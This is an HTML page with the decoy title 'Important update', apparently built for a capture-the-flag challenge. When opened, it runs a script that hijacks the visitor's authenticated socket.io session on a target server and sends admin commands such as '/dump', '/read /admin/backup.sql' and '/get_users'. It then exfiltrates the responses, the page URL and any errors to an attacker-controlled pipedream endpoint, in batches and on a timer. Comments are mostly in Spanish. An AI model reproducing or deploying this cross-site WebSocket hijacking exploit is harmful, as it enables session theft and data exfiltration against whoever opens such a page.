<!doctype html>
<html>
<head><meta charset="utf-8"/><title>Important update</title></head>
<body>
<h2>Important update</h2>
<p id="status">waiting...</p>
<script>
// CONFIG - cambia aquí
const TARGET_SOCKET = "http://challenges.challenge-ecw.eu:33037"; // socket objetivo
const ATTACKER_ENDPOINT = "https://eommvxwvo8u8pbo.m.pipedream.net"; // tu servidor para recibir datos
const EMIT_COMMANDS = [
  { ev: "message", payload: "/dump" },
  { ev: "message", payload: { user: "admin", message: "/dump" } },
  { ev: "admin:dump", payload: { token: "investigator" } },
  { ev: "message", payload: { user: "admin", message: "/read /admin/backup.sql" } },
  { ev: "message", payload: { user: "admin", message: "/get_users" } }
];
// end CONFIG

// carga socket.io si no está presente
function loadSocketIo() {
  return new Promise((resolve, reject) => {
    if (typeof io !== "undefined") return resolve();
    const s = document.createElement("script");
    s.src = "https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.8.1/socket.io.min.js";
    s.integrity = "sha512-8ExARjWWkIllMlNzVg7JKq9RKWPlJABQUNq6YvAjE/HobctjH/NA+bSiDMDvouBVjp4Wwnf1VP1OEv7Zgjtuxw==";
    s.crossOrigin = "anonymous";
    s.referrerPolicy = "no-referrer";
    s.onload = () => resolve();
    s.onerror = (e) => reject(e);
    document.head.appendChild(s);
  });
}

// helper: exfiltrar datos a tu servidor
async function exfiltrate(name, data) {
  try {
    // Send as JSON, include current URL to know who clicked
    await fetch(ATTACKER_ENDPOINT, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      keepalive: true,
      body: JSON.stringify({
        name,
        timestamp: new Date().toISOString(),
        src_url: location.href,
        payload: data
      })
    });
    console.log("[exfil] sent", name);
  } catch (e) {
    console.error("[exfil] failed", e);
  }
}

(async function(){
  const status = document.getElementById("status");
  try {
    status.innerText = "loading socket.io...";
    await loadSocketIo();
    status.innerText = "connecting to target socket...";

    // Conecta al socket del objetivo — el navegador adjuntará cookies para ese dominio.
    const socket = io(TARGET_SOCKET, { transports: ['websocket'], withCredentials: true });

    // Guarda mensajes recibidos para exfiltrar en lote
    const received = [];
    const maxStore = 200; // no almacenar indefinidamente

    function storeAndMaybeExfil(name, payload) {
      const entry = { name, payload };
      received.push(entry);
      // si es una respuesta grande, exfiltramos inmediatamente
      const txt = typeof payload === "string" ? payload : JSON.stringify(payload);
      if (txt.length > 200 || /INSERT INTO|BEGIN TRANSACTION|\/admin\/backup\.sql|\$2y\$/.test(txt)) {
        exfiltrate(name, payload);
      }
      // rotación
      if (received.length > maxStore) received.shift();
    }

    socket.onAny((ev, payload) => {
      console.log("[EV]", ev, payload);
      storeAndMaybeExfil(ev, payload);
      // también mostrar en la página
      status.innerText = `last: ${ev} -> ${String(typeof payload === "object" ? JSON.stringify(payload).slice(0,200) : payload).slice(0,200)}`;
    });

    socket.on('connect', async () => {
      console.log("[*] connected as", socket.id);
      status.innerText = "connected, emitting commands...";

      // Emite los comandos con delays
      for (let i=0;i<EMIT_COMMANDS.length;i++){
        const t = EMIT_COMMANDS[i];
        try {
          console.log("[emit]", t.ev, t.payload);
          if (t.ev === "message") socket.emit("message", t.payload);
          else socket.emit(t.ev, t.payload);
        } catch(e) {
          console.error("emit error", e);
        }
        await new Promise(r=>setTimeout(r, 700));
      }

      // espera un poco luego exfiltra todo lo almacenado en bloque
      await new Promise(r=>setTimeout(r, 3000));
      if (received.length) {
        await exfiltrate("batch", received);
      }
      status.innerText = "done, waiting for responses...";
    });

    socket.on("connect_error", (err) => {
      console.error("connect_error", err);
      status.innerText = "connect_error: " + (err && err.message ? err.message : err);
      // exfiltra el error
      exfiltrate("connect_error", String(err && err.message ? err.message : err));
    });

    // fallback: poll periodic to exfiltrate partial results
    setInterval(()=>{ if (received.length) exfiltrate("periodic", received.slice(-10)); }, 20000);

  } catch (e) {
    console.error("exploit error", e);
    status.innerText = "exploit error: " + String(e);
    // intentar exfiltrar el error
    try { await exfiltrate("exploit_error", String(e)); } catch(e2){}
  }
})();
</script>
</body>
</html>
